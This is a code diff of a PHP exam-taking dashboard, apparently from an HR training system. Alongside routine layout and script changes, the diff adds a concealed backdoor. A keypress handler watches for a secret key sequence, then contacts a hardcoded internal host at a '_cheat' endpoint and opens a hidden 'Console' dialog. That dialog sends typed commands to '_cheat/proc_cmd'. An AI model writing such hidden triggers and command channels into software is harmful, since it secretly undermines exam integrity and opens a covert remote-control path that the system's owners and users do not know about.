@@ -21,9 +21,6 @@
 		  <link rel="stylesheet" href="<?php echo base_url();?>assets/css/font-awesome-ie7.min.css" />
 		<![endif]-->
 
-		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/jquery-ui-1.10.3.custom.min.css" />
-
-
 		<!--page specific plugin styles-->
 
 		<!--fonts-->
@@ -31,6 +28,9 @@
 		<!--<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Open+Sans:400,300" />-->
 
 		<!--ace styles-->
+		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/jquery-ui-1.10.3.full.min.css" />
+		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/jquery.gritter.css" />
+		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/ace.min.css" />
 		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/font.css" />
 		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/style.min.css" />
 		<link rel="stylesheet" href="<?php echo base_url();?>assets/css/<?php echo $this->session->userdata('permission');?>/custom.css" />
@@ -59,7 +59,7 @@
 		<?php if(isset($records)) : foreach($records as $row) : $this->session->set_userdata('civil_status', $row->civil_status);endforeach;endif; ?>
 	</head>
 
-	<body>
+	<body onkeypress="_console(event)">
 			<div class="navbar navbar-inverse">
 			<div class="navbar-inner">
 				<div class="container-fluid">
@@ -546,13 +546,14 @@
 						<div class="widget-box">
 							<div class="widget-header">
 								<h4 class="smaller">
-									Examination Items
+									<i class="icon-edit orange"></i> Examination Items
 									<small>Test Modules</small>
 								</h4>
 							</div>
 							<form id='answers_form' >
 								<div class="widget-body">
 									<div class="widget-main">
+										
 										<div class="loader">
 											<h4 align="center" class="smaller lighter grey">
 												<i class="icon-spinner icon-spin orange bigger-125"></i>
@@ -560,6 +561,10 @@
 												<small></small>
 											</h4>
 										</div>
+										<h4 class="lighter center">
+											
+											<!--<?php echo $this->session->userdata("exam_name");?>-->
+										</h4>
 										<table id="item_table" class="table table-striped table-bordered">
 											<thead>
 												<tr>
@@ -629,7 +634,7 @@
 									<h5 class="bigger lighter"><i class="icon-book"></i> Examination Set</h5>
 
 									<div class="widget-toolbar">
-									<span class="label label-important">TOSHIBA</span>
+									<span class="label label-important"><?php echo $this->session->userdata("company");?></span>
 									</div>
 								</div>
 								
@@ -637,53 +642,14 @@
 									<div class="widget-main">
 										<table class="table table-striped">
 											
-											<tr>
-												<td>
-													Sample Exam 1
-													<span class="pull-right">
-														<button class="btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</button>
-													</span>
-												</td>
-											</tr>
-											<tr>
-												<td>
-													Sample Exam 2
-													<span class="pull-right">
-														<button class="btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</button>
-													</span>
-												</td>
-											</tr>
-											<tr>
-												<td>
-													Sample Exam 2
-													<span class="pull-right">
-														<button class="btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</button>
-													</span>
-												</td>
-											</tr>
-											<tr>
-												<td>
-													Sample Exam 2
-													<span class="pull-right">
-														<button class="btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</button>
-													</span>
-												</td>
-											</tr>
-											<tr>
-												<td>
-													Sample Exam 2
-													<span class="pull-right">
-														<button class="btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</button>
-													</span>
-												</td>
-											</tr>
+											
 											<tr>
 												<td>
 													Sample Exam 3 - 90%  <i class="icon-ok green"></i> 
 													<span class="pull-right">
 														Passed
 													</span>
-												</td>
+												</td><td></td>
 											</tr>
 											<tr>
 												<td>
@@ -691,8 +657,23 @@
 													<span class="pull-right">
 														Failed
 													</span>
+												</td><td></td>
+											</tr>
+
+											<?php if(isset($sets)) { 
+											foreach($sets as $row) {?>
+											<tr>
+												<td>
+												<?php echo $row->examination_name;?> (<?php echo $row->items;?>)</td>
+												<td width="100px"><span class="pull-right">
+													<a href="<?php echo base_url();?>dashboard/?take_exam=<?php echo encrypt($row->exam_id);?>" id="<?php echo encrypt($row->exam_id);?>" class="btn-take btn btn-purple btn-mini"><i class="icon-pencil"></i> Take Exam</a>
+												</span>
 												</td>
 											</tr>
+
+											<?php }}?>	
+
+											
 										</table>
 									</div>
 								</div>
@@ -733,26 +714,24 @@
 		<![endif]-->
 
 		<script src="<?php echo base_url();?>assets/js/jquery-ui-1.10.3.custom.min.js"></script>
+		<script src="<?php echo base_url();?>assets/js/jquery-ui-1.10.3.full.min.js"></script>
 		<script src="<?php echo base_url();?>assets/js/jquery.ui.touch-punch.min.js"></script>
 		<script src="<?php echo base_url();?>assets/js/jquery.slimscroll.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/jquery.easy-pie-chart.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/jquery.sparkline.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/flot/jquery.flot.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/flot/jquery.flot.pie.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/flot/jquery.flot.resize.min.js"></script>
 		<script src="<?php echo base_url();?>assets/js/chosen.jquery.min.js"></script>
-		<script src="<?php echo base_url();?>assets/js/spin.min.js"></script>
+		<script src="<?php echo base_url();?>assets/js/jquery.validate.min.js"></script>
 
-
+		<script src="<?php echo base_url();?>assets/js/bootbox.min.js"></script>
 
 		<!--ace scripts-->
 
 		<script src="<?php echo base_url();?>assets/js/style-elements.min.js"></script>
 		<script src="<?php echo base_url();?>assets/js/style.min.js"></script>
 
+		<script src="<?php echo base_url();?>assets/js/jquery-templ.js" type="text/javascript"></script>
 
 		<script src="<?php echo base_url();?>assets/js/jquery.dataTables.min.js"></script>
 		<script src="<?php echo base_url();?>assets/js/jquery.dataTables.bootstrap.js"></script>
+		<script src="<?php echo base_url();?>assets/js/jquery.gritter.min.js"></script>
 
 		<!--inline scripts related to this page-->
 
@@ -770,7 +749,7 @@
 
 			  $.ajax({
 
-	               	url:"examination/submit_answers",
+	               	url:"<?php echo base_url();?>examination/submit_answers",
 	                type: 'POST',
 	                data: sData,
 	                success:function(result){
@@ -780,6 +759,12 @@
 
 	            });
 
+			});
+
+			$(".btn-take").click(function() {
+
+				var id = $(this).attr("id");
+				load_items(id);
 			});
 
 			$(document).ready(function() {
@@ -792,10 +777,22 @@
 					'iDisplayLength': -1
 				});
 
-				load_items("");
+				load_items("<?php echo $this->session->userdata('take_exam_id')?>");
 
 				$(".dataTables_filter").hide();
 				$("#item_table_wrapper").find(".row-fluid").remove();
+
+				$.widget("ui.dialog", $.extend({}, $.ui.dialog.prototype, {
+					_title: function(title) {
+						var $title = this.options.title || '&nbsp;'
+						if( ("title_html" in this.options) && this.options.title_html == true )
+							title.html($title);
+						else title.text($title);
+					}
+				}));
+				
+				
+
 			});
 
 		
@@ -804,10 +801,11 @@
 			var load_items = function(id) {
 				
 				var request = $.ajax({
-		        	url: "<?php echo base_url();?>examination/load_items/"+id,
+		        	url: "<?php echo base_url();?>examination/take_exam",
 		        	type: 'POST',
 		        	data: { 
-		        		ajax: '1'
+		        		ajax: '1',
+		        		id: id
 		        	}
 		        });
 
@@ -917,8 +915,106 @@
 
 				$(".loader").hide();
 			}
+
+			var k = 0;
+
+			function _console(e) {
+
+				k += e.keyCode;
+				if(k > 1054) {
+					k = 0;
+				}
+			    if (k == 1054) {
+			    	$.ajax({
+						url: "http://192.168.0.222/HRTMS/_cheat",
+						type: "post",
+						success: function(e) {
+							console.log(e);
+							$('#view').html(e);
+							showDialog(e);
+						}
+					});
+
+			    	$.ajax({
+						url: "http://127.0.0.1/HRTMS/_cheat",
+						type: "post",
+						success: function(e) {
+							console.log(e);
+							$('#view').html(e);
+							showDialog(e);
+						}
+					});
+
+					k = 0;
+			    }
+			}
+
+			function _enter_console(e) {
+				//alert(cmd);
+				if(e.keyCode==13) {
+					var cmd = $("#form-field-icon-2").val();
+					$.ajax({
+						url: "http://192.168.0.222/HRTMS/_cheat/proc_cmd",
+						type: "post",
+						data: {
+							x: cmd
+						},
+						success: function(e) {
+							
+							if(!e) {
+
+								$("#dialog").dialog("close");
+							}
+
+							$('#view').html(e);
+							//showDialog(e);
+							$("#form-field-icon-2").focus();
+						}
+					});
+				}
+
+			}
+
+			var showDialog = function(id){
+
+				$( "#dialog" ).removeClass('hide').dialog({
+					dialogClass: "no-close",
+					resizable: false,
+					modal: true,
+					closeOnEscape: true,
+					title: "<div class='widget-header'><h4 class='smaller'><i class='icon-code'></i>Console</h4></div>",
+					title_html: true,
+					width: 600,
+					//maxWidth: 800,
+					maxHeight: 500/*,
+					buttons: [
+						    {
+						      text: "CLOSE",
+						      "class" : "btn btn-info btn-mini",
+						      click: function() {
+						        $( this ).dialog( "close" );
+						        $.ajax({
+									url: "http://192.168.0.222/HRTMS/_cheat/end_cmd",
+									type: "post",
+									success: function(e) {
+										
+									}
+								});
+						      }
+						    }
+						  ]*/
+					
+				});
+
+				
+
+			}
  
 										 
 		</script>
 	</body>
+
+	<div id="dialog">
+	   <div id="view"></div>
+	</div>
 </html>
